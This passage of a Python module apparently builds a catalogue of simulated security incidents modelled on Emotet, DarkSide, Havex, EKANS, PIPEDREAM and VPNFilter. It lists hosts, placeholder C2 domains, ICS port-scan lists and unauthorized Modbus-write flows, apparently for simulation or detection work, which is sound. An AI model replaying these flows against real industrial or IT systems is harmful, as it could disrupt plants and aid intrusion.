     _h("DNS01", "10.20.10.12", "dns", "win2019")],
    [("EMOTET-BOT", "EMOTET-C2", "c2-beacon", {
        "domain": "payments-invoice.example", "uri": "/wp-content/themes/x"}),
     ("EMOTET-BOT", "DNS01", "dns-tunnel", {"domain": "tun.emotet-c2.example"})]))

_reg(Incident("colonial", "Colonial Pipeline (DarkSide)", "IT", "2021",
    "Ransomware intrusion: encrypted (TLS) C2 beaconing, RDP password spraying, "
    "and SMB lateral movement to admin shares before mass encryption.",
    [_h("DARKSIDE-LOADER", "10.20.20.92", "ws", "win10"),
     _h("DARKSIDE-C2", "10.20.10.212", "web", "linux"),
     _h("DC01", "10.20.10.10", "dc", "win2019"),
     _h("FILESRV01", "10.20.10.13", "file", "win2019")],
    [("DARKSIDE-LOADER", "DARKSIDE-C2", "https-c2",
      {"domain": "cdn.darkside-c2.example"}),
     ("DARKSIDE-LOADER", "DC01", "rdp-brute", {}),
     ("DARKSIDE-LOADER", "FILESRV01", "smb-lateral", {"host": "FILESRV01"})]))

_reg(Incident("havex", "Havex / Dragonfly", "OT", "2014",
    "ICS espionage: HTTP C2 to a compromised update server and OPC/ICS port "
    "scanning to enumerate control-system devices on the plant network.",
    [_h("HAVEX-C2", "172.16.0.211", "web", "linux"),
     _h("SCADA-WS", "172.16.0.41", "eng", "win7"),
     _h("PLC-ENIP", "172.16.1.40", "plc", "rockwell", OUI_WIN)],
    [("SCADA-WS", "HAVEX-C2", "c2-beacon", {
        "domain": "update.havex-c2.example", "uri": "/wp08/wp-includes/x.php"}),
     ("SCADA-WS", "PLC-ENIP", "port-scan",
      {"scan_ports": [44818, 135, 502, 102, 4840]})]))

_reg(Incident("ekans", "EKANS / Snake", "OT", "2020",
    "ICS-aware ransomware: SMB lateral movement, then unauthorized Modbus "
    "writes alongside the stopping of OT processes before encryption.",
    [_h("EKANS-HOST", "172.16.0.42", "eng", "win10"),
     _h("HIST-OT", "172.16.0.12", "hist", "win2019"),
     _h("PLC-MB", "172.16.1.41", "plc", "schneider", OUI_SCHNEIDER,
        "BMX P34 2020")],
    [("EKANS-HOST", "HIST-OT", "smb-lateral", {"host": "HIST-OT"}),
     ("EKANS-HOST", "PLC-MB", "modbus-write", {})]))

_reg(Incident("pipedream", "PIPEDREAM / INCONTROLLER", "OT", "2022",
    "Modular ICS attack framework: control-protocol port scanning and "
    "unauthorized Modbus Write Multiple Registers to manipulate PLC outputs.",
    [_h("PIPEDREAM-ENGWS", "172.16.0.43", "eng", "win10"),
     _h("PLC-MODICON", "172.16.1.42", "plc", "schneider", OUI_SCHNEIDER,
        "BME P58 2040"),
     _h("PLC-OMRON", "172.16.1.43", "plc", "schneider", OUI_SCHNEIDER)],
    [("PIPEDREAM-ENGWS", "PLC-MODICON", "port-scan",
      {"scan_ports": [502, 44818, 102, 1911, 2222]}),
     ("PIPEDREAM-ENGWS", "PLC-MODICON", "modbus-write", {}),
     ("PIPEDREAM-ENGWS", "PLC-OMRON", "modbus-write", {})]))

_reg(Incident("vpnfilter", "VPNFilter", "OT", "2018",
    "Router/IoT botnet with an ICS module: HTTP C2 staging and Modbus traffic "
    "manipulation reaching SCADA/PLC devices behind edge routers.",
    [_h("VPNFILTER-C2", "10.20.30.210", "web", "linux"),
     _h("EDGE-ROUTER", "10.20.30.60", "ws", "linux"),
     _h("PLC-MB2", "172.16.1.44", "plc", "schneider", OUI_SCHNEIDER)],
    [("EDGE-ROUTER", "VPNFILTER-C2", "c2-beacon", {
        "domain": "photobucket-cdn.example", "uri": "/api/v1/stage2"}),
     ("EDGE-ROUTER", "PLC-MB2", "modbus-write", {})]))


def get(key: str) -> Incident:
    return INCIDENTS[key]


def all_incidents() -> List[Incident]:
    return list(INCIDENTS.values())
